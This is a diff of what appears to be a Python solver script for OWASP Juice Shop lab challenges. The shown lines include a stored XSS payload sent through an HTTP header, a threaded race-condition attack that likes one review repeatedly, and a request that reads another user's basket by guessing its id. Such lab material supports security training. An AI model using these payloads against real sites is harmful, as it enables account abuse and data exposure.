@@ -149,5 +149,12 @@ requests.post(url+'/api/Users',data={'email':'edmin@juice-sh.op','password':'edm
 requests.post(url+'/rest/user/data-export',data={'format':'1'},headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'edmin@juice-sh.op','password':'edmin123'}).text)['authentication']['token'])})
 # ---- HTTP-Header XSS (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> through an HTTP header.)
 requests.get(url+'/rest/saveLoginIp', headers={'True-Client-IP':'<iframe src="javascript:alert(`xss`)">','Authorization':'Bearer '+login['token']})
+# ---- Multiple Likes (Like any review at least three times as the same user.)
+productId=loads(requests.get(url+'/rest/products/3/reviews').text)['data'][0]['_id']
+def sendRequest(specifiedUrl):
+	requests.post(specifiedUrl, data={'id':productId}, headers={'Authorization':'Bearer '+login['token']})
+from concurrent.futures import ThreadPoolExecutor
+with ThreadPoolExecutor(max_workers=4) as pool:
+	[x for x in pool.map(sendRequest,[url+'/rest/products/reviews',url+'/rest/products/reviews',url+'/rest/products/reviews',url+'/rest/products/reviews'])]
 # ---- View Basket (View another user's shopping basket.)
 requests.get(url+'/rest/basket/'+str(login['bid']+1), headers={'Authorization':'Bearer '+login['token']})
